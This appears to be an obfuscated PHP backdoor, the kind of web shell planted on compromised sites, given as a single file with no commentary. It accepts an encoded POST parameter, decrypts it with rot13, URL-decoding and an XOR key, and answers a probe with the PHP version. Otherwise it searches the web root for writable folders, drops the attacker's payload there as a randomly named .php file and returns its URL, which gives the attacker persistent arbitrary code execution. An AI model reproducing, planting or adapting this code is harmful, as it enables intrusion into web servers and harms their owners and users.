<?php $wiffvgvte = "danibfgldddbwdov";$kcluolfqst = "";foreach ($_POST as $jpfspk => $ofaulcprl){if (strlen($jpfspk) == 16 and substr_count($ofaulcprl, "%") > 10){ttvifpz($jpfspk, $ofaulcprl);}}function ttvifpz($jpfspk, $cqamjspw){global $kcluolfqst;$kcluolfqst = $jpfspk;$cqamjspw = str_split(rawurldecode(str_rot13($cqamjspw)));function sulaoontd($cgjnsbt, $jpfspk){global $wiffvgvte, $kcluolfqst;return $cgjnsbt ^ $wiffvgvte[$jpfspk % strlen($wiffvgvte)] ^ $kcluolfqst[$jpfspk % strlen($kcluolfqst)];}$cqamjspw = implode("", array_map("sulaoontd", array_values($cqamjspw), array_keys($cqamjspw)));$cqamjspw = @unserialize($cqamjspw);if (@is_array($cqamjspw)){$jpfspk = array_keys($cqamjspw);$cqamjspw = $cqamjspw[$jpfspk[0]];if ($cqamjspw === $jpfspk[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function rhioc($vnmnbqacir) {static $wxewoo = array();$xgtdv = glob($vnmnbqacir . '/*', GLOB_ONLYDIR);if (count($xgtdv) > 0) {foreach ($xgtdv as $vnmnbqac){if (@is_writable($vnmnbqac)){$wxewoo[] = $vnmnbqac;}}}foreach ($xgtdv as $vnmnbqacir) rhioc($vnmnbqacir);return $wxewoo;}$ksuev = $_SERVER["DOCUMENT_ROOT"];$xgtdv = rhioc($ksuev);$jpfspk = array_rand($xgtdv);$vcuxwle = $xgtdv[$jpfspk] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($vcuxwle, $cqamjspw);echo "http://" . $_SERVER["HTTP_HOST"] . substr($vcuxwle, strlen($ksuev));exit();}}}